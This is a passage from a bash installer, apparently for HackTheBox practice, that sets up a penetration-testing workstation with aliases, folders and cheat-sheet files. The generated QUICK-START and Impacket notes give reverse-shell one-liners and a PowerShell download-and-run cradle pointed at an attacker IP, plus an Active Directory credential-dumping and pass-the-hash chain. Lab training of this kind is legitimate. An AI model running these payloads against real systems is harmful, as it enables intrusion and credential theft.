else
    log_skip "mimikatz.exe already present"
fi

# ============================================
# PHASE 12: CUSTOM ENVIRONMENT FILE
# ============================================
log_section "Phase 12: Creating Custom Environment with QoL Aliases"

cat > "$USER_HOME/.shellshock_env" << 'EOFENV'
# ============================================
# SHELLSHOCK ENVIRONMENT
# Quality of Life aliases and shortcuts
# ============================================

# Go configuration
export GOROOT=/usr/local/go
export GOPATH=$HOME/go
export PATH=$GOROOT/bin:$GOPATH/bin:$PATH

# ============================================
# IMPACKET SHORTCUTS (no more "impacket-" prefix!)
# ============================================
alias secretsdump='impacket-secretsdump'
alias GetNPUsers='impacket-GetNPUsers'
alias GetUserSPNs='impacket-GetUserSPNs'
alias smbclient='impacket-smbclient'
alias smbserver='impacket-smbserver'
alias psexec='impacket-psexec'
alias wmiexec='impacket-wmiexec'
alias dcomexec='impacket-dcomexec'
alias atexec='impacket-atexec'
alias smbexec='impacket-smbexec'
alias GetADUsers='impacket-GetADUsers'
alias GetADComputers='impacket-GetADComputers'
alias getTGT='impacket-getTGT'
alias getST='impacket-getST'
alias ticketer='impacket-ticketer'
alias lookupsid='impacket-lookupsid'
alias reg='impacket-reg'
alias rpcdump='impacket-rpcdump'
alias samrdump='impacket-samrdump'

# ============================================
# TOOL SHORTCUTS
# ============================================
alias responder='cd ~/tools/repos/Responder && python3 Responder.py'
alias enum4linux-ng='~/tools/repos/enum4linux-ng/enum4linux-ng.py'
alias penelope='~/tools/scripts/penelope.py'
alias linpeas='~/tools/scripts/linpeas.sh'
alias winpeas='~/tools/scripts/winpeas.exe'
alias pspy='~/tools/scripts/pspy64'
alias john='/usr/sbin/john'
alias ferox='feroxbuster'
alias rustscan='rustscan'

# ============================================
# HTB WORKFLOW
# ============================================
export HTB_ENGAGEMENTS="$HOME/engagements"

# Create new HTB engagement directory
htb-new() {
    if [[ -z "$1" ]]; then
        echo "Usage: htb-new <machine-name>"
        return 1
    fi
    local machine="$1"
    mkdir -p "$HTB_ENGAGEMENTS/$machine"/{nmap,loot,exploit,www}
    cd "$HTB_ENGAGEMENTS/$machine"
    echo "Created engagement: $machine"
    echo "Subdirectories: nmap/ loot/ exploit/ www/"
}

# Quick navigate to engagement
htb() {
    if [[ -z "$1" ]]; then
        cd "$HTB_ENGAGEMENTS"
    else
        cd "$HTB_ENGAGEMENTS/$1" 2>/dev/null || echo "Engagement not found: $1"
    fi
}

# List all engagements
htb-list() {
    ls -1 "$HTB_ENGAGEMENTS" 2>/dev/null || echo "No engagements yet"
}

# ============================================
# NETWORK & RECON
# ============================================
alias myip='ip -br -c a'
alias ports='netstat -tulanp'
alias listening='ss -tulpn'

# Quick ping sweep
sweep() {
    if [[ -z "$1" ]]; then
        echo "Usage: sweep <subnet> (e.g., sweep 10.10.10.0/24)"
        return 1
    fi
    nmap -sn "$1" -oG - | grep "Up" | cut -d ' ' -f 2
}

# Quick port scan
portscan() {
    if [[ -z "$1" ]]; then
        echo "Usage: portscan <target>"
        return 1
    fi
    nmap -p- -T4 --min-rate 1000 "$1"
}

# ============================================
# WEB ENUMERATION
# ============================================
# Quick directory brute-force
dirscan() {
    if [[ -z "$1" ]]; then
        echo "Usage: dirscan <url>"
        return 1
    fi
    gobuster dir -u "$1" -w ~/wordlists/SecLists/Discovery/Web-Content/common.txt -t 50
}

# ============================================
# FILE SERVING
# ============================================
# Quick HTTP server
serve() {
    local port="${1:-8000}"
    python3 -m http.server "$port"
}

# Quick SMB server
smbserve() {
    local share="${1:-share}"
    local path="${2:-.}"
    impacket-smbserver "$share" "$path" -smb2support
}

# ============================================
# ARCHIVE EXTRACTION
# ============================================
extract() {
    if [[ ! -f "$1" ]]; then
        echo "Error: '$1' is not a valid file"
        return 1
    fi

    case "$1" in
        *.tar.bz2)   tar xjf "$1"     ;;
        *.tar.gz)    tar xzf "$1"     ;;
        *.tar.xz)    tar xJf "$1"     ;;
        *.bz2)       bunzip2 "$1"     ;;
        *.rar)       unrar e "$1"     ;;
        *.gz)        gunzip "$1"      ;;
        *.tar)       tar xf "$1"      ;;
        *.tbz2)      tar xjf "$1"     ;;
        *.tgz)       tar xzf "$1"     ;;
        *.zip)       unzip -q "$1"    ;;
        *.Z)         uncompress "$1"  ;;
        *.7z)        7z x "$1"        ;;
        *)
            echo "Error: '$1' cannot be extracted"
            return 1
            ;;
    esac
    echo "✓ Extracted: $1"
}

# ============================================
# SYSTEM ALIASES
# ============================================
alias ls='ls --color=auto'
alias ll='ls -lah'
alias la='ls -A'
alias l='ls -CF'
alias grep='grep --color=auto'
alias egrep='egrep --color=auto'
alias fgrep='fgrep --color=auto'
alias c='clear'
alias h='history'
alias hg='history | grep'
alias ..='cd ..'
alias ...='cd ../..'
alias ....='cd ../../..'
alias home='cd $HOME'
alias ~='cd ~'

# ============================================
# NETWORK/RECON ALIASES
# ============================================
alias myip='ip -br -c addr show | grep UP'
alias ports='netstat -tulanp'
alias listening='ss -tulwn'
alias vpncheck='ip addr show tun0 2>/dev/null || echo "No VPN connected"'
alias htbip='ip addr show tun0 2>/dev/null | grep -oP "inet \K[\d.]+"'

# ============================================
# FILE OPERATIONS
# ============================================
alias df='df -h'
alias du='du -h'
alias free='free -h'
alias mkdir='mkdir -pv'
alias mount='mount | column -t'
alias path='echo -e ${PATH//:/\\n}'
alias now='date +"%Y-%m-%d_%H-%M-%S"'

# ============================================
# TEXT PROCESSING
# ============================================
alias less='less -R'
alias diff='diff --color=auto'
alias count='wc -l'

# ============================================
# PROCESS MANAGEMENT
# ============================================
alias psg='ps aux | grep -v grep | grep -i -e VSZ -e'
alias topcpu='ps aux --sort=-%cpu | head -11'
alias topmem='ps aux --sort=-%mem | head -11'

# ============================================
# GIT SHORTCUTS
# ============================================
alias gs='git status'
alias ga='git add'
alias gc='git commit'
alias gp='git push'
alias gl='git log --oneline --graph --decorate'
alias gd='git diff'

# ============================================
# PYTHON/TOOLS
# ============================================
alias python='python3'
alias pip='pip3'
alias serve='python3 -m http.server 8000'
alias venv='python3 -m venv'

# ============================================
# COMPRESSION
# ============================================
alias tarc='tar -czvf'
alias tarx='tar -xzvf'
alias tart='tar -tzvf'

# ============================================
# PERMISSIONS
# ============================================
alias chmod-x='chmod +x'
alias chown-me='sudo chown -R $USER:$USER'

# ============================================
# SAFETY ALIASES
# ============================================
alias rm='rm -i'
alias cp='cp -i'
alias mv='mv -i'
alias ln='ln -i'
alias chown='chown --preserve-root'
alias chmod='chmod --preserve-root'
alias chgrp='chgrp --preserve-root'
EOFENV

# Add to bash config only
if [[ -f "$USER_HOME/.bashrc" ]] && ! grep -q ".shellshock_env" "$USER_HOME/.bashrc"; then
    cat >> "$USER_HOME/.bashrc" << 'EOF'

# ShellShock environment
[[ -f ~/.shellshock_env ]] && source ~/.shellshock_env
EOF
    log_info "Added ShellShock env to .bashrc"
fi

# ============================================
# PHASE 13: DOCUMENTATION & SUPPLEMENTAL SCRIPTS
# ============================================
log_section "Phase 13: Documentation & Supplemental Scripts"

# Create documentation directory
DOCS_DIR="$USER_HOME/Desktop/SHELLSHOCK-DOCS"
log_info "Creating docs directory: $DOCS_DIR"
mkdir -p "$DOCS_DIR"
chown -R "$USERNAME":"$USERNAME" "$DOCS_DIR"
chmod 755 "$DOCS_DIR"
log_success "Docs directory ready"

# ALIASES.txt
log_info "Creating ALIASES.txt..."
cat > "$DOCS_DIR/ALIASES.txt" << 'EOFDOC'
# ShellShock - Aliases & Shortcuts

## SYSTEM ALIASES
```bash
# Navigation
ll                    # ls -lah (detailed list)
la                    # ls -A (show hidden)
..                    # cd ..
...                   # cd ../..
....                  # cd ../../..
home                  # cd $HOME

# History
h                     # history
hg                    # history | grep

# Display
c                     # clear
grep                  # grep --color=auto
less                  # less -R (color support)
diff                  # diff --color=auto

# System info
myip                  # Show network interfaces
ports                 # Show all listening ports
listening             # Show listening services
df                    # df -h (human readable)
free                  # free -h (human readable)
path                  # Show PATH one per line
now                   # Current timestamp

# Process management
psg                   # ps aux | grep
topcpu                # Top CPU consumers
topmem                # Top memory consumers

# Files
mkdir                 # mkdir -pv (create parents, verbose)
count                 # wc -l (line count)
extract               # Universal archive extractor

# Compression
tarc                  # tar create (tar -czvf)
tarx                  # tar extract (tar -xzvf)
tart                  # tar list (tar -tzvf)

# Permissions
chmod-x               # chmod +x (make executable)
chown-me              # sudo chown -R $USER:$USER

# Safety (interactive prompts)
rm                    # rm -i
cp                    # cp -i
mv                    # mv -i
```

## GIT SHORTCUTS
```bash
gs                    # git status
ga                    # git add
gc                    # git commit
gp                    # git push
gl                    # git log (pretty format)
gd                    # git diff
```

## PYTHON SHORTCUTS
```bash
python                # python3
pip                   # pip3
serve                 # python3 -m http.server 8000
venv                  # python3 -m venv
```

## NETWORK SHORTCUTS
```bash
vpncheck              # Check if VPN connected
htbip                 # Show HTB VPN IP (tun0)
```

---

**Version:** ShellShock
EOFDOC
echo "**Created:** $(date)" >> "$DOCS_DIR/ALIASES.txt"
log_success "ALIASES.txt created"

# HTB-WORKFLOW.txt
log_info "Creating HTB-WORKFLOW.txt..."
cat > "$DOCS_DIR/HTB-WORKFLOW.txt" << 'EOFDOC'
# ShellShock - HTB Workflow

## HTB ENGAGEMENT FUNCTIONS
```bash
htb-new <machine>     # Create new engagement structure
htb <machine>         # Navigate to engagement directory
htb-list              # List all engagements
```

## DIRECTORY STRUCTURE

When you create a new engagement with `htb-new`, the following structure is created:
```
~/engagements/<machine>/
├── nmap/             # Port scans and enumeration
├── loot/             # Credentials, hashes, sensitive files
├── exploit/          # Exploit scripts and payloads
└── www/              # Files to serve via HTTP
```

## RECON SHORTCUTS
```bash
sweep 10.10.10.0/24         # Quick ping sweep of network
portscan 10.10.10.50        # Fast TCP port scan
dirscan http://target.com   # Directory/file bruteforce
```

## FILE SERVING
```bash
serve 8000              # Start Python HTTP server on port 8000
smbserve share .        # Start SMB server sharing current directory
```

## WORKFLOW EXAMPLE
```bash
# 1. Create new engagement
htb-new example

# 2. Navigate to it (auto-created)
cd ~/engagements/example

# 3. Initial scan
portscan 10.10.10.50 | tee nmap/quick.txt

# 4. Full enumeration
nmap -sCV -p- 10.10.10.50 -oA nmap/full

# 5. Start serving tools
cd www
serve 8000

# 6. Store credentials as you find them
echo "admin:P@ssw0rd" >> ../loot/creds.txt
```

---

**Version:** ShellShock
EOFDOC
echo "**Created:** $(date)" >> "$DOCS_DIR/HTB-WORKFLOW.txt"
log_success "HTB-WORKFLOW.txt created"

# IMPACKET.txt
log_info "Creating IMPACKET.txt..."
cat > "$DOCS_DIR/IMPACKET.txt" << 'EOFDOC'
# ShellShock - Impacket Shortcuts

## SHORTCUTS AVAILABLE

All Impacket tools can be called WITHOUT the `impacket-` prefix:
```bash
secretsdump domain/user:pass@target
GetNPUsers domain/ -usersfile users.txt
GetUserSPNs domain/user:pass -dc-ip IP
psexec domain/user:pass@target
wmiexec domain/user:pass@target
smbserver share . -smb2support
```

## FULL TOOL LIST

### Credential Harvesting
- secretsdump
- GetNPUsers
- GetUserSPNs
- getTGT
- getST

### Remote Execution
- psexec
- wmiexec
- dcomexec
- atexec
- smbexec

### Enumeration
- GetADUsers
- GetADComputers
- lookupsid
- rpcdump
- samrdump
- reg

### SMB
- smbclient
- smbserver

### Kerberos
- ticketer

## COMMON USAGE EXAMPLES

### AS-REP Roasting (no credentials)
```bash
GetNPUsers domain.local/ -usersfile users.txt -format hashcat -outputfile hashes.txt
```

### Kerberoasting (need valid creds)
```bash
GetUserSPNs domain.local/user:pass -dc-ip 10.10.10.1 -request -outputfile kerberoast.txt
```

### Dump all domain credentials
```bash
secretsdump domain.local/admin:pass@10.10.10.1
```

### Pass-the-Hash execution
```bash
psexec -hashes :nthash domain.local/admin@10.10.10.1
wmiexec -hashes :nthash domain.local/admin@10.10.10.1
```

### SMB server for exfiltration
```bash
smbserver share . -smb2support -username user -password pass
```

### Enumerate domain users
```bash
GetADUsers -all domain.local/user:pass -dc-ip 10.10.10.1
```

---

**Version:** ShellShock 
EOFDOC
echo "**Created:** $(date)" >> "$DOCS_DIR/IMPACKET.txt"
log_success "IMPACKET.txt created"

# TOOLS.txt
log_info "Creating TOOLS.txt..."
cat > "$DOCS_DIR/TOOLS.txt" << 'EOFDOC'
# ShellShock - Installed Tools

## ACTIVE DIRECTORY

- impacket - Full suite of AD attack tools
- netexec (nxc) - Network service exploitation
- bloodhound - Active Directory visualization
- bloodyAD - AD privilege escalation framework
- ldapdomaindump - LDAP enumeration
- certipy-ad - Active Directory Certificate Services exploitation
- sprayhound - Password spraying
- kerbrute - Kerberos user enumeration

## NETWORK TOOLS

- nmap - Network scanner
- masscan - Fast port scanner
- Responder - LLMNR/NBT-NS poisoner
- chisel - Fast TCP/UDP tunnel
- ligolo-ng - Advanced network pivoting

## WEB APPLICATION

- httpx - HTTP toolkit and probe
- ffuf - Fast web fuzzer
- gobuster - Directory/file brute-forcer
- nuclei - Vulnerability scanner
- nikto - Web server scanner
- sqlmap - SQL injection exploitation
- wfuzz - Web application fuzzer
- whatweb - Web technology identifier

## ENUMERATION

- subfinder - Subdomain discovery
- dnsx - DNS toolkit
- enum4linux-ng - SMB/LDAP enumeration (~/tools/repos/enum4linux-ng)
- enum4linux - Classic SMB enumeration
- rustscan - Ultra-fast port scanner
- naabu - Port scanner (ProjectDiscovery suite)
- nbtscan - NetBIOS scanner
- onesixtyone - SNMP scanner
- smbmap - SMB share enumeration
- netdiscover - Network discovery
- katana - Web crawler (ProjectDiscovery)
- gf - Pattern matching for bug hunting
- anew - Append new lines (dedup tool)

## WEB AUTOMATION

- playwright + Chromium - Headless browser for XSS-bot/SSRF challenges
- feroxbuster - Recursive web content discovery
- interactsh-client - OOB interaction detection (free Burp Collaborator)

## EXPLOITATION

- metasploit - Exploitation framework
- evil-winrm - Windows Remote Management shell
- penelope - Advanced reverse shell handler
- ROPgadget - ROP chain builder
- ropper - ROP chain finder
- crackmapexec - Network exploitation framework

## BINARY EXPLOITATION

- pwntools - Python CTF/exploitation framework
- pycryptodome - Cryptography library for crypto challenges
- scapy - Packet crafting and analysis
- gdb + pwndbg - Enhanced GDB for pwn challenges
- gef - GDB Enhanced Features (downloaded to ~/.gdbinit-gef.py)

## FORENSICS & STEGANOGRAPHY

- binwalk - Firmware/binary analysis
- steghide - Steganography hide/extract
- stegseek - Fast steghide bruteforcer
- exiftool - Metadata extraction
- foremost - File carving

## POST-EXPLOITATION

- linPEAS - Linux privilege escalation scanner
- winPEAS - Windows privilege escalation scanner
- pspy64 - Linux process monitoring without root (~/tools/scripts/pspy64)

## WINDOWS BINARIES

Located in ~/tools/windows/:

- SharpHound.exe - BloodHound data collector
- Seatbelt.exe - Windows host enumeration
- Rubeus.exe - Kerberos abuse toolkit
- PowerView.ps1 - Active Directory enumeration
- Certify.exe - ADCS certificate exploitation
- KrbRelayUp.exe - Kerberos relay privilege escalation
- PrintSpoofer64.exe - Printer spooler privilege escalation
- GodPotato.exe - Token impersonation / potato attack
- mimikatz.exe - Credential extraction
- chisel.exe - TCP/UDP tunnel (Windows client)
- nc.exe - Netcat for Windows

## TOOL SHORTCUTS

Some tools have quick-access shortcuts:
```bash
responder              # ~/tools/repos/Responder/Responder.py
enum4linux-ng          # ~/tools/repos/enum4linux-ng/enum4linux-ng.py
penelope               # ~/tools/scripts/penelope.py
linpeas                # ~/tools/scripts/linpeas.sh
winpeas                # ~/tools/scripts/winpeas.exe
```

## DIRECTORY LAYOUT
```
~/tools/
├── repos/              # Git repositories
│   ├── Responder/
│   ├── enum4linux-ng/
│   ├── PEASS-ng/
│   ├── penelope/
│   ├── SecLists/
│   └── PayloadsAllTheThings/
├── scripts/            # Quick access scripts
│   ├── linpeas.sh
│   ├── winpeas.exe
│   └── penelope.py
└── windows/            # Windows binaries
    ├── SharpHound.exe
    ├── Seatbelt.exe
    ├── Rubeus.exe
    └── PowerView.ps1

~/wordlists/            # Password and fuzzing lists
└── SecLists/           # Full SecLists collection
    └── rockyou.txt     # Symlinked for easy access
```

---

**Version:** ShellShock
EOFDOC
echo "**Created:** $(date)" >> "$DOCS_DIR/TOOLS.txt"
log_success "TOOLS.txt created"

# QUICK-START.txt
log_info "Creating QUICK-START.txt..."
cat > "$DOCS_DIR/QUICK-START.txt" << 'EOFDOC'
# ShellShock - Quick Start Examples

## ACTIVE DIRECTORY ATTACK CHAIN

### 1. Initial Enumeration (no creds)
```bash
# Enumerate users via Kerberos
kerbrute userenum -d domain.local users.txt --dc 10.10.10.1

# AS-REP Roasting (users with pre-auth disabled)
GetNPUsers domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt

# Crack hashes
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### 2. With Valid Credentials
```bash
# SMB enumeration
nxc smb 10.10.10.1 -u user -p pass --shares
nxc smb 10.10.10.1 -u user -p pass --users

# Kerberoasting (service accounts)
GetUserSPNs domain.local/user:pass -dc-ip 10.10.10.1 -request -outputfile kerberoast.txt

# BloodHound collection
bloodhound-python -c All -u user -p pass -d domain.local -ns 10.10.10.1
```

### 3. Credential Dumping
```bash
# DCSync attack
secretsdump domain.local/admin:pass@10.10.10.1 -just-dc

# Remote SAM dump
secretsdump admin:pass@10.10.10.50
```

### 4. Lateral Movement
```bash
# PSExec
psexec domain.local/admin:pass@10.10.10.50

# WMI
wmiexec domain.local/admin:pass@10.10.10.50

# Pass-the-Hash
wmiexec -hashes :nthash domain.local/admin@10.10.10.50
```

## WEB APPLICATION WORKFLOW

### 1. Subdomain Enumeration
```bash
subfinder -d target.com -o subs.txt
```

### 2. HTTP Probing
```bash
httpx -l subs.txt -tech-detect -title -status-code -o live.txt
```

### 3. Directory Bruteforce
```bash
# Using shortcut
dirscan https://target.com

# Manual ffuf
ffuf -u https://target.com/FUZZ -w ~/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
```

### 4. Vulnerability Scanning
```bash
nuclei -l live.txt -t ~/tools/repos/nuclei-templates/
```

## REVERSE SHELL HANDLING

### Start Penelope Listener
```bash
penelope -i tun0 4444
```

### Common Payloads

#### Bash
```bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```

#### Python
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```

#### PowerShell
```powershell
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')"
```

## FILE TRANSFER TECHNIQUES

### From Attacker to Target

#### HTTP Server (attacker)
```bash
cd ~/engagements/machine/www
serve 8000
```

#### Download (target - Linux)
```bash
wget http://10.10.14.5:8000/linpeas.sh
curl -O http://10.10.14.5:8000/linpeas.sh
```

#### Download (target - Windows)
```powershell
certutil -urlcache -f http://10.10.14.5:8000/winpeas.exe winpeas.exe
Invoke-WebRequest -Uri http://10.10.14.5:8000/winpeas.exe -OutFile winpeas.exe
```

### From Target to Attacker

#### SMB Server (attacker)
```bash
smbserve share . -smb2support -username user -password pass
```

#### Upload (target - Windows)
```cmd
copy file.txt \\10.10.14.5\share\
```

## PRIVILEGE ESCALATION

### Linux
```bash
# Transfer and run linPEAS
wget http://10.10.14.5:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_output.txt
```

### Windows
```powershell
# Transfer and run winPEAS
certutil -urlcache -f http://10.10.14.5:8000/winpeas.exe winpeas.exe
.\winpeas.exe
```

## UPDATE COMMANDS

### Go Tools
```bash
cd ~/go/bin
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
```

### Python Tools
```bash
pip3 install -U --break-system-packages impacket bloodhound netexec
pipx upgrade-all
```

### Git Repositories
```bash
cd ~/tools/repos
for repo in */; do cd "$repo" && git pull && cd ..; done
```

---

**Version:** ShellShock
EOFDOC
echo "**Created:** $(date)" >> "$DOCS_DIR/QUICK-START.txt"
log_success "QUICK-START.txt created"
log_success "All documentation files created"

# Clone supplemental scripts to Desktop
log_info "Cloning supplemental scripts from GitHub..."
TEMP_CLONE="/tmp/shellshock-supplementals"
rm -rf "$TEMP_CLONE"

log_info "Git clone starting (this may take a moment)..."
# Use timeout to prevent hanging (60 second timeout)
if timeout 60 git clone --depth 1 --branch main https://github.com/Jamie-loring/ShellShock.git "$TEMP_CLONE" 2>&1 | tee -a "$LOG_FILE"; then
    log_success "Repository cloned successfully"
    if [[ -d "$TEMP_CLONE/supplimentals" ]]; then
        mkdir -p "$USER_HOME/Desktop/ShellShock-Scripts"
        cp -r "$TEMP_CLONE/supplimentals"/* "$USER_HOME/Desktop/ShellShock-Scripts/"
        chown -R "$USERNAME":"$USERNAME" "$USER_HOME/Desktop/ShellShock-Scripts"

        # Fix filenames with spaces (prevents execution errors)
        if [[ -f "$USER_HOME/Desktop/ShellShock-Scripts/end engagement.sh" ]]; then
            mv "$USER_HOME/Desktop/ShellShock-Scripts/end engagement.sh" \
               "$USER_HOME/Desktop/ShellShock-Scripts/end-engagement.sh"
            log_info "Renamed 'end engagement.sh' -> 'end-engagement.sh'"
        fi

        # Fix tools-update.sh to point to correct repos directory
        if [[ -f "$USER_HOME/Desktop/ShellShock-Scripts/tools-update.sh" ]]; then
            sed -i 's|TOOLS_DIR="$HOME/tools"|TOOLS_DIR="$HOME/tools/repos"|' \
                "$USER_HOME/Desktop/ShellShock-Scripts/tools-update.sh"
            log_info "Fixed TOOLS_DIR path in tools-update.sh"
        fi

        # Ensure end-engagement.sh clears Firefox saved passwords
        END_ENGAGE="$USER_HOME/Desktop/ShellShock-Scripts/end-engagement.sh"
        if [[ -f "$END_ENGAGE" ]]; then
            if ! grep -q "logins.json" "$END_ENGAGE"; then
                sed -i '/cookies\.sqlite/a\        find "$FIREFOX_PROFILES" -type f -name "logins.json" -exec rm -f {} \\; 2>/dev/null\n        find "$FIREFOX_PROFILES" -type f -name "key4.db" -exec rm -f {} \\; 2>/dev/null\n        find "$FIREFOX_PROFILES" -type f -name "signons.sqlite" -exec rm -f {} \\; 2>/dev/null\n        echo "    ✓ Firefox saved usernames/passwords cleared"' "$END_ENGAGE"
                log_info "Added Firefox saved password cleanup to end-engagement.sh"
            fi
        fi

        # Make all scripts executable
        find "$USER_HOME/Desktop/ShellShock-Scripts" -type f -name "*.sh" -exec chmod +x {} \;

        SCRIPT_COUNT=$(find "$USER_HOME/Desktop/ShellShock-Scripts" -type f -name "*.sh" | wc -l)
        log_success "Installed $SCRIPT_COUNT supplemental scripts to Desktop/ShellShock-Scripts"

        # Overwrite VBox installer with fixed version (apt-first, ISO as fallback)
        # The repo version ISO-only method fails on kernel mismatch
        log_info "Installing fixed VBox Guest Additions installer..."
        cat > "$USER_HOME/Desktop/ShellShock-Scripts/install_vbox_additions.sh" << 'VBOXEOF'
#!/bin/bash
# ============================================
# VirtualBox Guest Additions Installer
# apt method first, ISO as fallback
# ShellShock
# ============================================

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

log_info()    { echo -e "${GREEN}[+]${NC} $1"; }
log_warn()    { echo -e "${YELLOW}[!]${NC} $1"; }
log_error()   { echo -e "${RED}[-]${NC} $1"; }
log_section() { echo -e "\n${CYAN}[*] $1${NC}"; }

if [[ $EUID -ne 0 ]]; then
    log_error "Run with sudo"
    exit 1
fi

log_section "VirtualBox Guest Additions Installer"

if ! dmidecode -s system-product-name 2>/dev/null | grep -qi "VirtualBox"; then
    log_warn "Does not appear to be a VirtualBox VM"
    read -p "Continue anyway? (y/n): " -n 1 -r; echo
    [[ $REPLY =~ ^[Yy]$ ]] || exit 1
fi

ALREADY_INSTALLED=false
command -v VBoxClient &>/dev/null && ALREADY_INSTALLED=true
dpkg -l virtualbox-guest-utils 2>/dev/null | grep -q "^ii" && ALREADY_INSTALLED=true
[[ -f /usr/sbin/VBoxService ]] && ALREADY_INSTALLED=true

if [[ "$ALREADY_INSTALLED" == "true" ]]; then
    INSTALLED_VER=$(VBoxClient --version 2>/dev/null | head -n1 || echo "unknown")
    log_info "Already installed: $INSTALLED_VER"
    read -p "Reinstall? (y/n): " -n 1 -r; echo
    [[ $REPLY =~ ^[Yy]$ ]] || exit 0
fi

try_apt_install() {
    log_section "Method 1: apt (pre-built modules)"
    apt-get update -qq
    DEBIAN_FRONTEND=noninteractive apt-get install -y \
        virtualbox-guest-x11 \
        virtualbox-guest-utils \
        virtualbox-guest-dkms 2>&1 && return 0 || return 1
}

try_iso_install() {
    log_section "Method 2: ISO from Oracle"
    apt-get install -y build-essential dkms "linux-headers-$(uname -r)" gcc make perl

    VBOX_VERSION=""
    VBOX_VERSION=$(dmidecode -s system-version 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+' | head -n1 || true)
    [[ -z "$VBOX_VERSION" ]] && VBOX_VERSION=$(dmidecode -s bios-version 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+' | head -n1 || true)
    [[ -z "$VBOX_VERSION" ]] && VBOX_VERSION=$(wget -qO- https://download.virtualbox.org/virtualbox/LATEST.TXT 2>/dev/null || true)
    [[ -z "$VBOX_VERSION" ]] && VBOX_VERSION="7.1.4"
    log_info "Target version: $VBOX_VERSION"

    ISO_URL="https://download.virtualbox.org/virtualbox/${VBOX_VERSION}/VBoxGuestAdditions_${VBOX_VERSION}.iso"
    ISO_FILE="/tmp/VBoxGuestAdditions_${VBOX_VERSION}.iso"

    if [[ ! -f "$ISO_FILE" ]]; then
        wget --progress=bar:force --timeout=120 "$ISO_URL" -O "$ISO_FILE" 2>&1 || {
            ISO_URL="https://download.virtualbox.org/virtualbox/7.1.4/VBoxGuestAdditions_7.1.4.iso"
            ISO_FILE="/tmp/VBoxGuestAdditions_7.1.4.iso"
            wget --progress=bar:force --timeout=120 "$ISO_URL" -O "$ISO_FILE" 2>&1 || return 1
        }
    fi

    ISO_SIZE=$(stat -c%s "$ISO_FILE" 2>/dev/null || echo "0")
    [[ "$ISO_SIZE" -lt 10000000 ]] && { log_error "ISO too small — bad download"; rm -f "$ISO_FILE"; return 1; }

    MOUNT_POINT="/mnt/vbox-guest-additions"
    mkdir -p "$MOUNT_POINT"
    mountpoint -q "$MOUNT_POINT" && umount "$MOUNT_POINT"
    mount -o loop,ro "$ISO_FILE" "$MOUNT_POINT" || return 1

    ISO_EXIT=0
    sh "$MOUNT_POINT/VBoxLinuxAdditions.run" --nox11 2>&1 || ISO_EXIT=$?
    umount "$MOUNT_POINT" 2>/dev/null; rmdir "$MOUNT_POINT" 2>/dev/null

    if [[ $ISO_EXIT -eq 0 ]] || [[ $ISO_EXIT -eq 2 ]]; then
        rm -f "$ISO_FILE"; return 0
    else
        log_error "ISO installer failed (exit $ISO_EXIT)"
        return 1
    fi
}

INSTALL_SUCCESS=false
try_apt_install && INSTALL_SUCCESS=true || { try_iso_install && INSTALL_SUCCESS=true; }

log_section "Verifying"
lsmod | grep -q vboxguest && log_info "✓ vboxguest module loaded" || log_warn "Module not loaded yet (reboot needed)"
command -v VBoxClient &>/dev/null && log_info "✓ VBoxClient: $(VBoxClient --version 2>/dev/null | head -n1)" || log_warn "VBoxClient not found"

echo ""
if [[ "$INSTALL_SUCCESS" == true ]]; then
    echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${GREEN}  VirtualBox Guest Additions Installed!${NC}"
    echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
    echo "After reboot: Devices → Shared Clipboard → Bidirectional"
    read -p "Reboot now? (y/n): " -n 1 -r; echo
    [[ $REPLY =~ ^[Yy]$ ]] && { sleep 2; reboot; }
else
    echo -e "${RED}  Both methods failed${NC}"
    echo "Manual: sudo apt-get install -y virtualbox-guest-x11 virtualbox-guest-utils virtualbox-guest-dkms"
fi
VBOXEOF
        chmod +x "$USER_HOME/Desktop/ShellShock-Scripts/install_vbox_additions.sh"
        chown "$USERNAME":"$USERNAME" "$USER_HOME/Desktop/ShellShock-Scripts/install_vbox_additions.sh"
        log_info "VBox installer updated with apt-first fallback method"
    else
        log_warn "Supplemental scripts directory not found in repository"
    fi
    rm -rf "$TEMP_CLONE"
else
    CLONE_EXIT=$?
    if [[ $CLONE_EXIT -eq 124 ]]; then
        log_warn "Git clone timed out after 60 seconds (network issue?)"
    else
        log_warn "Failed to clone supplemental scripts (exit code: $CLONE_EXIT)"
    fi
    log_warn "Supplemental scripts not installed (non-critical, continuing)"
    rm -rf "$TEMP_CLONE"
fi

# Set ownership on all documentation
chown -R "$USERNAME":"$USERNAME" "$DOCS_DIR"
log_success "Created documentation in $DOCS_DIR/"
log_info "  - ALIASES.txt"
log_info "  - HTB-WORKFLOW.txt"
log_info "  - IMPACKET.txt"
log_info "  - TOOLS.txt"
log_info "  - QUICK-START.txt"
log_success "Phase 13 completed successfully"

# ============================================
# PHASE 14: DESKTOP THEME & APPEARANCE
# ============================================
log_section "Phase 14: Applying Parrot/HTB Desktop Theme"

# Install theme packages first — can't apply what isn't installed
log_info "Installing theme packages..."
THEME_PACKAGES=(
    "parrot-themes"
    "papirus-icon-theme"
    "parrot-wallpapers"
    "mate-themes"
    "caja-open-terminal"
)
for pkg in "${THEME_PACKAGES[@]}"; do
    if dpkg -l "$pkg" 2>/dev/null | grep -q "^ii"; then
        log_skip "$pkg already installed"
    else
